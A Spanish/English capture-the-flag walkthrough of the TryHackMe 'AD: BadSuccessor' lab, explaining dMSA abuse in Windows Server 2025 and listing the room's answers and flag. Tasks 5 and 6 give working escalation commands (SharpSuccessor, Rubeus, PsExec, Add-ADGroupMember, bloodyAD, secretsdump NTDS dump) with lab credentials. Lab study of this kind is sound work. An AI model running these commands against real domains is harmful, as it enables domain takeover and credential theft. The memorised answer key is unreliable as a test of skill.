# AD: BadSuccessor
| **Dificultad** | Medium |
| **Tipo** | Walkthrough |
| **Slug** | `adbadsuccessor` |
| **Link** | [TryHackMe](https://tryhackme.com/room/adbadsuccessor) |
| **Sección** | 02 Level Medium |
| **Fuente** | happycamper84 (Medium), t-will-gillis.github.io, thmrevenant/tryhackme (GitHub), Meshky's BlueTeam (GitHub) |
| **Componentes** | Windows Server 2025, Active Directory, dMSA, RDP, SharpSuccessor, Rubeus, PsExec, bloodyAD, Impacket, secretsdump.py, Evil-WinRM, Kerberos |
| **Impacto** | Explota el ataque BadSuccessor: escalada de privilegios que abusa de la migración de cuentas de servicio administradas delegadas (dMSA) de Windows Server 2025 para pasar de un usuario de bajo privilegio a Domain Admin. |
---
**Contexto:** Laboratorio de Active Directory (Premium) que explota el ataque **BadSuccessor**, una escalada de privilegios que abusa de la pertenencia al flujo de migración de cuentas de servicio administradas delegadas (dMSA) introducidas en Windows Server 2025. El objetivo es pasar de un usuario de bajo privilegio a Domain Admin controlando objetos dMSA en una OU con delegación insegura.
*EN: A Premium Active Directory lab exploiting the **BadSuccessor** attack, a privilege escalation that abuses the delegated Managed Service Account (dMSA) migration workflow introduced in Windows Server 2025. The goal is to go from a low-privileged user to Domain Admin by controlling dMSA objects in a weakly delegated OU.*
## Solucionario
### Task 1 - Let's explore the BadSuccessor attack
**Explicación:** Presentación del ataque BadSuccessor. Se explica que un usuario con `CreateChild` (o derechos de escritura equivalentes) sobre una OU del dominio puede crear un objeto dMSA y manipular sus atributos (`msDS-ManagedAccountPrecededByLink`, `msDS-DelegatedMSAState`) para suplantar a una cuenta privilegiada, explotando el workflow de migración de cuentas.
*EN: Introduction to the BadSuccessor attack. A user with `CreateChild` (or equivalent write rights) on a domain OU can create a dMSA object and manipulate its attributes (`msDS-ManagedAccountPrecededByLink`, `msDS-DelegatedMSAState`) to impersonate a privileged account by abusing the account migration workflow.*
| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | Continue to the next task | `No answer needed` |
### Task 2 - Verify your network is working correctly
**Explicación:** Conexión RDP a la máquina Windows Server 2025 del lab usando xfreerdp/Remmina con las credenciales facilitadas por la sala.
*EN: RDP connection to the lab's Windows Server 2025 machine using xfreerdp/Remmina with the credentials provided by the room.*
| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | I have confirmed that my network is working correctly | `No answer needed` |
### Task 3 - Introduction to delegated Managed Service Accounts
**Explicación:** Explica la diferencia entre sMSA (Windows Server 2008 R2), gMSA (Windows Server 2012) y dMSA (Windows Server 2025). El dMSA es gestionado por un administrador y permite ejecutar servicios en un servidor concreto; su password se rota automáticamente.
*EN: Explains the difference between sMSA (Windows Server 2008 R2), gMSA (Windows Server 2012) and dMSA (Windows Server 2025). A dMSA is admin-managed and allows running services on a specific server; its password rotates automatically.*
| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | Which version of MS Windows introduced dMSA? | `Windows Server 2025` |
### Task 4 - Identify the vulnerable accounts
**Explicación:** Se conecta por RDP como `tbyte` y se copia al escritorio la herramienta de Blue Team de Mishky. Con `Audit-AllOUs` se auditan las OU del dominio y se detectan las cuentas `hmann`, `ditall` y `tbyte` con permisos `CreateChild` (todos los GUID a 0) sobre `ou=LabOU,dc=tryhackme,dc=local`, lo que permite crear dMSAs.
*EN: Connect via RDP as `tbyte` and copy Mishky's Blue Team tool to the Desktop. Run `Audit-AllOUs` to audit the domain OUs and detect accounts `hmann`, `ditall` and `tbyte` with `CreateChild` rights (all GUIDs set to 0) on `ou=LabOU,dc=tryhackme,dc=local`, which allows creating dMSAs.*
| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | What is the username of the third account? | `ditall` |
### Task 5 - Exploit the BadSuccessor attack from Windows
**Explicación:** Usando `SharpSuccessor.exe` se crea una dMSA armada (`pentest_dmsa`) que suplanta a `Administrator` dentro de la OU vulnerable. Con `Rubeus` se solicitan tickets Kerberos (`tgtdeleg`, `asktgs /dmsa`) y se obtiene acceso a `DC-LAB2025-01` vía PsExec. Finalmente se añade `tbyte` al grupo Domain Admins y se lee la flag del escritorio de Administrador.
*EN: Using `SharpSuccessor.exe` a weaponized dMSA (`pentest_dmsa`) impersonating `Administrator` is created inside the vulnerable OU. With `Rubeus`, Kerberos tickets are requested (`tgtdeleg`, `asktgs /dmsa`) and access to `DC-LAB2025-01` is obtained via PsExec. Finally `tbyte` is added to the Domain Admins group and the flag is read from the Administrator's Desktop.*

```powershell
cd C:\PoC
.\SharpSuccessor.exe add /path:"ou=LabOU,dc=tryhackme,dc=local" /account:tbyte /name:pentest_dmsa /impersonate:Administrator
.\Rubeus.exe tgtdeleg /nowrap
.\Rubeus.exe asktgs /targetuser:pentest_dmsa$ /service:krbtgt/tryhackme.local /opsec /dmsa /nowrap /ptt /ticket:<ticket>
.\Rubeus.exe asktgs /user:pentest_dmsa$ /service:cifs/DC-LAB2025-01.tryhackme.local /opsec /dmsa /nowrap /ptt /ticket:<ticket>
C:\Users\tbyte\Desktop\PSTools\PsExec.exe \\DC-LAB2025-01.tryhackme.local PowerShell
Add-ADGroupMember -Identity "Domain Admins" -Members "tbyte"
Get-Content C:\Users\Administrator\Desktop\flag.txt
```
| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | What is the flag on the Administrator's Desktop? | `THM{Successors_Unplanned_Upgrade}` |
### Task 6 - I love Linux! (Exploit from Kali)
**Explicación:** Repetición del ataque desde Kali Linux usando `bloodyAD` e impacket. Se instala bloodyAD, se añade `DC-LAB2025-01.tryhackme.local` al `/etc/hosts`, se enumeran OU escribibles con `get writable`, se crea y manipula la dMSA, y finalmente se extrae NTDS.dit con `secretsdump.py` o se ingresa por Evil-WinRM.
*EN: Repeating the attack from Kali Linux using `bloodyAD` and impacket. Install bloodyAD, add `DC-LAB2025-01.tryhackme.local` to `/etc/hosts`, enumerate writable OUs with `get writable`, create and manipulate the dMSA, and finally dump NTDS.dit with `secretsdump.py` or connect via Evil-WinRM.*

```bash
uv tool install - python 3.13 git+https://github.com/CravateRouge/bloodyAD
bloodyAD -d tryhackme.local -u 'tbyte' -p 'P@SSw0rd345' --host DC-LAB2025-01.tryhackme.local get writable -detail
/usr/share/doc/python3-impacket/examples/secretsdump.py tryhackme.local/tbyte:'P@SSw0rd345'@10.211.101.10 > BadSuccessor_NTDS.txt
evil-winrm -i 10.211.101.20 -u tbyte -p 'P@SSw0rd345'
```
| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | Continue while following the steps from Kali | `No answer needed` |
### Task 7 - Further learning
**Explicación:** Recomendación de explorar el módulo "Recent Threats" de TryHackMe y otras vulnerabilidades recientes de Active Directory para ampliar conocimientos.
*EN: Recommendation to explore TryHackMe's "Recent Threats" module and other recent Active Directory vulnerabilities to broaden knowledge.*
| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | Continue to further your learning | `No answer needed` |
---
**Metodología:** Acceso inicial (RDP como `tbyte`) → auditar delegación con `Audit-AllOUs` → identificar OU abusable (`ou=LabOU`) → crear dMSA armada con `SharpSuccessor.exe` → obtener tickets con `Rubeus` → ejecución de código en el DC con PsExec → `Add-ADGroupMember` a Domain Admins → flag → repetición del flujo desde Kali con `bloodyAD` + `secretsdump.py`.

```
tbyte (bajo privilegio)
      |  RDP + Audit-AllOUs
      v
OU "LabOU"  (CreateChild con GUIDs a 0)
      |  SharpSuccessor add /impersonate:Administrator
      v
dMSA "pentest_dmsa"  (objecto suplantador)
      |  Rubeus tgtdeleg → asktgs /dmsa /ptt
      v
Ticket CIFS → DC-LAB2025-01
      |  PsExec
      v
Add-ADGroupMember "Domain Admins"  →  flag.txt
```
**Learning chain:** dMSA → delegación insegura (CreateChild/GenericAll con GUIDs 0 sobre una OU) → suplantación de cuenta privilegiada → tickets Kerberos → acceso al DC → Domain Admins.
**MITRE ATT&CK:** T1078 (Valid Accounts), T1558 (Steal or Forge Kerberos Tickets), T1098.007 (Additional Cloud Delegated Admin) / manipulación de atributos de cuenta, T1136.001 (Create Account), T1021.006 (Windows Remote Management) / PsExec, T1482/Discovery de dominio.
**Fuente:** [TryHackMe - AD: BadSuccessor](https://tryhackme.com/room/adbadsuccessor)